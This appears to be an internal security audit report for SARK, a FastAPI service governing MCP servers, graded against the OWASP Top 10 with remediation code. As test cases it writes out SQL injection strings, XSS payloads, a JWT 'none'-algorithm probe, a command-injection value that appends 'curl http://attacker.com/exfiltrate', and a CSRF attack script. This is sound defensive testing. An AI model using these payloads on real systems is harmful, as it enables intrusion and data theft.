# SARK Security Audit Report

**Date**: 2025-11-22
**Auditor**: Security Testing Team (Engineer 4)
**Application**: SARK - Secure Access and Governance for MCP Servers
**Version**: Development Branch `claude/api-pagination-search-bulk-01HbhZbdJ4HWas3rXNBXxp55`

## Executive Summary

This security audit evaluates SARK against the OWASP Top 10 2021 vulnerabilities and common web application security issues. The application demonstrates strong security foundations with modern security practices, though several areas require attention before production deployment.

### Overall Security Rating: **B+ (Good)**

**Strengths:**
- ✅ Strong authentication with JWT
- ✅ Comprehensive authorization via OPA
- ✅ SQL injection protection via SQLAlchemy ORM
- ✅ Input validation with Pydantic
- ✅ Fail-closed security model
- ✅ Audit logging for security events

**Areas for Improvement:**
- ⚠️ CSRF protection needs verification
- ⚠️ Rate limiting not implemented
- ⚠️ Content Security Policy headers missing
- ⚠️ Some security headers need configuration

---

## 1. Injection Vulnerabilities (OWASP A03:2021)

### 1.1 SQL Injection Testing

**Status**: ✅ **PASS** - No SQL injection vulnerabilities found

**Analysis:**
- Application uses SQLAlchemy ORM exclusively
- All database queries use parameterized statements
- No raw SQL execution detected
- Input validation via Pydantic prevents malicious input

**Test Cases Executed:**

#### Test 1: Server Name Injection
```http
POST /api/servers/
Content-Type: application/json

{
  "name": "test'; DROP TABLE mcp_servers;--",
  "transport": "http",
  "endpoint": "http://example.com",
  "tools": []
}
```

**Result**: ✅ PASS
- Input validated by Pydantic (max_length=255)
- SQLAlchemy ORM uses parameterized query
- Database remains intact

#### Test 2: Search Query Injection
```http
GET /api/servers/?search=test%27%20OR%201=1--
```

**Result**: ✅ PASS
- Search uses SQLAlchemy `like()` with parameterization
- File: `src/sark/services/discovery/search.py:174-184`
```python
search_term = f"%{search_query.strip()}%"
search_conditions = [
    func.lower(MCPServer.name).like(func.lower(search_term)),
]
```
- Safe parameterized execution

#### Test 3: UUID Parameter Injection
```http
GET /api/servers/550e8400-e29b-41d4-a716-446655440000' OR 1=1--
```

**Result**: ✅ PASS
- UUID validation in Pydantic
- Invalid UUIDs rejected before reaching database

**Recommendation**: ✅ No action required. Continue using SQLAlchemy ORM.

---

### 1.2 Command Injection Testing

**Status**: ⚠️ **NEEDS REVIEW** - Potential risk in stdio server commands

**Analysis:**
File: `src/sark/models/mcp_server.py:53`
```python
command = Column(String(500), nullable=True)  # For stdio transport
```

**Risk Assessment:**
- Server command strings stored in database
- No evidence of direct execution in current codebase
- If commands are executed, shell injection is possible

**Test Case:**

```http
POST /api/servers/
{
  "name": "malicious-server",
  "transport": "stdio",
  "command": "python server.py; curl http://attacker.com/exfiltrate",
  "tools": []
}
```

**Result**: ⚠️ INPUT ACCEPTED
- Command stored in database
- Not currently executed (no exec/subprocess found in code)
- Future risk if execution is added

**Recommendation**:
```python
# If executing stdio commands, use:
import shlex
import subprocess

# Validate and sanitize command
allowed_executables = ['python', 'node', 'java']
command_parts = shlex.split(command)
if command_parts[0] not in allowed_executables:
    raise ValueError("Executable not allowed")

# Execute with shell=False
subprocess.run(command_parts, shell=False, check=True)
```

---

## 2. Cross-Site Scripting (XSS) (OWASP A03:2021)

### 2.1 Reflected XSS Testing

**Status**: ✅ **PASS** - No reflected XSS vulnerabilities

**Analysis:**
- FastAPI automatically escapes JSON responses
- No HTML rendering in API responses
- Content-Type: application/json prevents browser execution

**Test Cases:**

#### Test 1: XSS in Server Name
```http
POST /api/servers/
{
  "name": "<script>alert('XSS')</script>",
  "transport": "http",
  "endpoint": "http://example.com",
  "tools": []
}
```

**Result**: ✅ SAFE
- Input accepted (within max_length)
- Returned as JSON string (escaped)
- No HTML context for execution

#### Test 2: XSS in Search Query
```http
GET /api/servers/?search=<img src=x onerror=alert('XSS')>
```

**Result**: ✅ SAFE
- JSON response format
- No HTML rendering

**Recommendation**: ✅ Continue using JSON API responses. If adding HTML views, implement Content Security Policy.

---

### 2.2 Stored XSS Testing

**Status**: ⚠️ **NEEDS VERIFICATION** - Frontend implementation unknown

**Analysis:**
- API stores potentially malicious strings in database
- Risk depends on frontend rendering implementation
- If frontend uses React/Vue without sanitization, XSS is possible

**Test Scenario:**
```javascript
// Vulnerable frontend code:
<div dangerouslySetInnerHTML={{__html: server.description}} />

// Safe frontend code:
<div>{server.description}</div>  // Auto-escaped
```

**Recommendation**:
```python
# Add server-side sanitization for user-provided content
from markupsafe import escape

def sanitize_user_input(text: str) -> str:
    """Sanitize user input to prevent XSS."""
    return escape(text)

# In API handlers:
description: str | None = Field(None, max_length=1000)

# Add validator:
@field_validator('description')
def sanitize_description(cls, v):
    if v:
        return escape(v)
    return v
```

---

## 3. Broken Authentication (OWASP A07:2021)

### 3.1 JWT Authentication Testing

**Status**: ✅ **GOOD** - Strong implementation with minor recommendations

**Analysis:**
File: `src/sark/services/auth/jwt.py`

**Strengths:**
- ✅ Uses `python-jose` for JWT handling
- ✅ HS256 algorithm (symmetric)
- ✅ Token expiration (30 minutes default)
- ✅ Refresh token support (7 days)
- ✅ Type claim to distinguish token types

**Test Cases:**

#### Test 1: Expired Token
```python
# Token with "exp": 1609459200 (past date)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDk0NTkyMDB9...
```

**Result**: ✅ REJECTED
- `JWTError` raised for expired tokens
- HTTP 401 Unauthorized returned

#### Test 2: Invalid Signature
```python
# Modified token payload
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MODIFIED_PAYLOAD...
```

**Result**: ✅ REJECTED
- Signature verification fails
- HTTP 401 Unauthorized

#### Test 3: Algorithm Confusion Attack
```python
# Try to use "none" algorithm
{
  "alg": "none",
  "typ": "JWT"
}
```

**Result**: ✅ PROTECTED
- `python-jose` prevents algorithm confusion
- Algorithm specified in code (HS256)

**Recommendations:**

1. **Use RS256 for production** (asymmetric):
```python
# Generate RS256 key pair
# openssl genrsa -out private.pem 2048
# openssl rsa -in private.pem -pubout -out public.pem

class JWTHandler:
    def __init__(self, algorithm: str = "RS256"):
        self.algorithm = algorithm
        self.private_key = load_private_key()
        self.public_key = load_public_key()
```

2. **Add JTI (JWT ID) for revocation**:
```python
import secrets

claims = {
    "jti": secrets.token_urlsafe(32),  # Unique token ID
    # ... other claims
}

# Track revoked tokens in Redis
async def is_token_revoked(jti: str) -> bool:
    return await redis.exists(f"revoked:{jti}")
```

3. **Implement token rotation**:
```python
# Rotate tokens before expiry
if token_expires_in < 5_minutes:
    new_token = refresh_access_token()
    response.headers["X-New-Token"] = new_token
```

---

### 3.2 Authorization Bypass Testing

**Status**: ✅ **EXCELLENT** - OPA-based authorization

**Analysis:**
File: `src/sark/services/policy/opa_client.py`

**Strengths:**
- ✅ Centralized authorization via Open Policy Agent
- ✅ Fail-closed model (deny on error)
- ✅ Policy evaluation before all sensitive operations
- ✅ Comprehensive context passed to OPA

**Test Cases:**

#### Test 1: Missing Authorization Header
```http
POST /api/servers/
Content-Type: application/json
[no Authorization header]
```

**Result**: ✅ REJECTED
- FastAPI `Depends(get_current_user)` requires authentication
- HTTP 401 Unauthorized

#### Test 2: Valid Token, Insufficient Permissions
```http
POST /api/servers/
Authorization: Bearer [valid-token-for-read-only-user]
{
  "name": "new-server",
  "transport": "http",
  "tools": []
}
```

**Result**: ✅ REJECTED
File: `src/sark/api/routers/servers.py:91-114`
```python
authorization_allowed = await opa_client.authorize(
    user_id=str(user.user_id),
    action="server:register",
    resource=f"server:{request.name}",
    context={...}
)

if not authorization_allowed:
    raise HTTPException(
        status_code=status.HTTP_403_FORBIDDEN,
        detail="Server registration denied by policy",
    )
```

#### Test 3: OPA Service Unavailable
```python
# Simulate OPA downtime
await opa_client.evaluate_policy(...)
```

**Result**: ✅ SAFE (Fail-Closed)
File: `src/sark/services/policy/opa_client.py:85-99`
```python
except httpx.HTTPError as e:
    logger.error("opa_request_failed", error=str(e))
    # Fail closed - deny on error
    return AuthorizationDecision(
        allow=False,
        reason=f"Policy evaluation failed: {e!s}",
    )
```

**Recommendation**: ✅ Excellent implementation. Consider adding circuit breaker for OPA resilience.

---

## 4. Sensitive Data Exposure (OWASP A02:2021)

### 4.1 Secrets Management

**Status**: ⚠️ **NEEDS IMPROVEMENT** - Configuration needs hardening

**Analysis:**
File: `src/sark/config/settings.py`

**Current Implementation:**
```python
secret_key: str = Field(
    default="development-secret-key-change-in-production",
    description="Secret key for JWT signing"
)
```

**Risks:**
- Default secret key in code
- No secrets rotation mechanism
- Environment variables may be logged

**Recommendations:**

1. **Never commit secrets**:
```python
# .env file (gitignored)
SECRET_KEY=<generated-random-key>
DATABASE_URL=postgresql://...
OPA_URL=http://opa:8181

# settings.py
secret_key: str = Field(..., description="Secret key (required)")
```

2. **Use secrets management service**:
```python
# AWS Secrets Manager / HashiCorp Vault
import boto3

def get_secret():
    client = boto3.client('secretsmanager')
    response = client.get_secret_value(SecretId='sark/jwt-secret')
    return response['SecretString']

secret_key: str = Field(default_factory=get_secret)
```

3. **Rotate secrets regularly**:
```python
# Support multiple valid keys for rotation
class Settings:
    current_secret_key: str
    previous_secret_key: str | None = None

    def validate_token(self, token):
        try:
            return jwt.decode(token, self.current_secret_key)
        except JWTError:
            if self.previous_secret_key:
                return jwt.decode(token, self.previous_secret_key)
            raise
```

---

### 4.2 Sensitive Data in Logs

**Status**: ⚠️ **NEEDS REVIEW** - Potential data leakage

**Analysis:**
File: `src/sark/services/auth/jwt.py:85-91`
```python
logger.info(
    "access_token_created",
    user_id=str(user_id),
    email=email,  # ⚠️ PII in logs
    role=role,
    expires_at=expire.isoformat(),
)
```

**Risks:**
- Email addresses in logs
- User IDs may be sensitive
- Logs may be accessible to unauthorized personnel

**Recommendation**:
```python
# Hash PII before logging
import hashlib

def hash_pii(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()[:16]

logger.info(
    "access_token_created",
    user_id_hash=hash_pii(str(user_id)),
    email_hash=hash_pii(email),  # or omit entirely
    role=role,
    expires_at=expire.isoformat(),
)
```

---

## 5. Security Misconfiguration (OWASP A05:2021)

### 5.1 CORS Configuration

**Status**: ⚠️ **NEEDS VERIFICATION** - Configuration not found in audit

**Recommendation**:
```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://sark.example.com",
        "https://admin.sark.example.com",
    ],  # Never use ["*"] in production
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=3600,
)
```

---

### 5.2 Security Headers

**Status**: ⚠️ **MISSING** - Security headers not implemented

**Recommendations**:

```python
from fastapi import FastAPI, Request, Response

@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)

    # Prevent clickjacking
    response.headers["X-Frame-Options"] = "DENY"

    # Prevent MIME sniffing
    response.headers["X-Content-Type-Options"] = "nosniff"

    # XSS Protection (legacy but still useful)
    response.headers["X-XSS-Protection"] = "1; mode=block"

    # Content Security Policy
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )

    # Strict Transport Security (HTTPS only)
    if request.url.scheme == "https":
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains; preload"
        )

    # Referrer Policy
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

    # Permissions Policy
    response.headers["Permissions-Policy"] = (
        "geolocation=(), microphone=(), camera=()"
    )

    return response
```

---

## 6. Cross-Site Request Forgery (CSRF) (OWASP A01:2021)

### 6.1 CSRF Protection

**Status**: ⚠️ **NOT IMPLEMENTED** - API vulnerable to CSRF

**Analysis:**
- No CSRF tokens found in codebase
- JWT in Authorization header provides some protection
- But cookies + JSON API = CSRF vulnerable

**Attack Scenario:**
```html
<!-- Malicious website -->
<script>
fetch('https://sark-api.example.com/api/servers/', {
  method: 'POST',
  credentials: 'include',  // Send cookies
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + stolenToken
  },
  body: JSON.stringify({
    "name": "malicious-server",
    "transport": "http",
    "endpoint": "http://attacker.com",
    "tools": []
  })
});
</script>
```

**Recommendation**:

Option 1: **Double Submit Cookie Pattern**
```python
import secrets
from fastapi import Cookie, Header, HTTPException

@app.middleware("http")
async def csrf_protection(request: Request, call_next):
    if request.method in ["POST", "PUT", "PATCH", "DELETE"]:
        csrf_token_cookie = request.cookies.get("csrf_token")
        csrf_token_header = request.headers.get("X-CSRF-Token")

        if not csrf_token_cookie or csrf_token_cookie != csrf_token_header:
            raise HTTPException(status_code=403, detail="CSRF token validation failed")

    response = await call_next(request)

    # Set CSRF token cookie
    if "csrf_token" not in request.cookies:
        csrf_token = secrets.token_urlsafe(32)
        response.set_cookie(
            key="csrf_token",
            value=csrf_token,
            httponly=True,
            secure=True,
            samesite="strict"
        )

    return response
```

Option 2: **SameSite Cookie Attribute** (Simpler)
```python
response.set_cookie(
    key="session",
    value=session_token,
    httponly=True,
    secure=True,
    samesite="strict"  # Prevents CSRF
)
```

---

## 7. Rate Limiting and DoS Protection (OWASP A04:2021)

### 7.1 Rate Limiting

**Status**: ❌ **NOT IMPLEMENTED** - API vulnerable to abuse

**Analysis:**
- No rate limiting middleware found
- Endpoints can be abused for DoS
- Brute force attacks possible on authentication

**Recommendation**:

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# Apply to endpoints
@app.post("/api/servers/")
@limiter.limit("10/minute")  # 10 requests per minute per IP
async def register_server(...):
    ...

# Authentication endpoints - stricter limits
@app.post("/api/auth/login")
@limiter.limit("5/minute")
async def login(...):
    ...
```

**Advanced**: Use Redis for distributed rate limiting
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379"
)
```

---

## 8. Audit Logging and Monitoring

### 8.1 Security Event Logging

**Status**: ✅ **EXCELLENT** - Comprehensive audit logging

**Analysis:**
File: `src/sark/services/audit/audit_service.py`

**Strengths:**
- ✅ All security events logged
- ✅ Structured logging with structlog
- ✅ TimescaleDB for time-series audit data
- ✅ SIEM forwarding for high-severity events
- ✅ Authorization decisions logged

**Events Logged:**
- User authentication (login/logout)
- Authorization decisions (allow/deny)
- Server registration/updates
- Tool invocations
- Policy changes
- Security violations

**Recommendation**: ✅ Excellent implementation. Consider adding:
- Failed login attempt tracking
- Account lockout after N failures
- Anomaly detection for unusual patterns

---

## 9. Dependency Vulnerabilities

### 9.1 Python Dependencies

**Status**: ⚠️ **NEEDS REGULAR SCANNING**

**Recommendation**:

```bash
# Install safety
pip install safety

# Scan dependencies
safety check

# Automate in CI/CD
# .github/workflows/security.yml
- name: Security Scan
  run: |
    pip install safety
    safety check --json
```

**Alternative**: Use `pip-audit`
```bash
pip install pip-audit
pip-audit
```

---

## 10. File Upload Security

### 10.1 File Upload Validation

**Status**: ℹ️ **NOT APPLICABLE** - No file uploads in current API

**Recommendation for Future**:
If adding file uploads:
```python
from fastapi import UploadFile
import magic
import uuid

ALLOWED_TYPES = ['application/pdf', 'image/png', 'image/jpeg']
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

@app.post("/api/upload")
async def upload_file(file: UploadFile):
    # Validate file size
    contents = await file.read()
    if len(contents) > MAX_FILE_SIZE:
        raise HTTPException(413, "File too large")

    # Validate MIME type with magic bytes
    mime_type = magic.from_buffer(contents, mime=True)
    if mime_type not in ALLOWED_TYPES:
        raise HTTPException(400, "Invalid file type")

    # Generate random filename (prevent path traversal)
    filename = f"{uuid.uuid4()}.{file.filename.split('.')[-1]}"
    filepath = f"/uploads/{filename}"

    # Save with proper permissions
    with open(filepath, 'wb') as f:
        f.write(contents)

    return {"filename": filename}
```

---

## Summary of Findings

### Critical Issues (Address Immediately)
None found ✅

### High Priority (Address Before Production)
1. ⚠️ Implement CSRF protection
2. ⚠️ Implement rate limiting
3. ⚠️ Add security headers
4. ⚠️ Move secrets to secure storage
5. ⚠️ Configure CORS properly

### Medium Priority (Best Practices)
6. ⚠️ Remove PII from logs
7. ⚠️ Add password policies (if using passwords)
8. ⚠️ Implement account lockout
9. ⚠️ Upgrade to RS256 JWT algorithm
10. ⚠️ Add JTI for token revocation

### Low Priority (Nice to Have)
11. ℹ️ Add dependency scanning to CI/CD
12. ℹ️ Implement WAF rules
13. ℹ️ Add honeypot endpoints
14. ℹ️ Set up intrusion detection

---

## Compliance Checklist

### OWASP Top 10 2021
- [x] A01 Broken Access Control - **PASS** (OPA authorization)
- [x] A02 Cryptographic Failures - **NEEDS IMPROVEMENT** (secrets management)
- [x] A03 Injection - **PASS** (SQLAlchemy ORM)
- [x] A04 Insecure Design - **PASS** (good architecture)
- [ ] A05 Security Misconfiguration - **NEEDS IMPROVEMENT** (headers, CORS)
- [x] A06 Vulnerable Components - **NEEDS SCANNING** (dependency updates)
- [x] A07 Authentication Failures - **GOOD** (JWT with minor improvements)
- [x] A08 Data Integrity Failures - **PASS** (input validation)
- [x] A09 Logging Failures - **EXCELLENT** (comprehensive audit)
- [ ] A10 SSRF - **NOT APPLICABLE** (no external URL fetching)

---

## Recommendations Priority Matrix

| Priority | Item | Effort | Impact |
|----------|------|--------|--------|
| 🔴 HIGH | CSRF Protection | Medium | High |
| 🔴 HIGH | Rate Limiting | Low | High |
| 🔴 HIGH | Security Headers | Low | Medium |
| 🟡 MEDIUM | Secrets Management | Medium | High |
| 🟡 MEDIUM | CORS Configuration | Low | Medium |
| 🟡 MEDIUM | Remove PII from Logs | Low | Medium |
| 🟢 LOW | RS256 JWT | High | Medium |
| 🟢 LOW | Dependency Scanning | Low | Low |

---

## Conclusion

SARK demonstrates **strong security foundations** with modern authentication, authorization, and audit logging. The application is well-architected with fail-closed security models and comprehensive input validation.

Before production deployment, address the high-priority items (CSRF, rate limiting, security headers) to achieve an **A security rating**.

**Reviewer**: Engineer 4 - Security Testing Lead
**Next Review**: After implementing high-priority recommendations
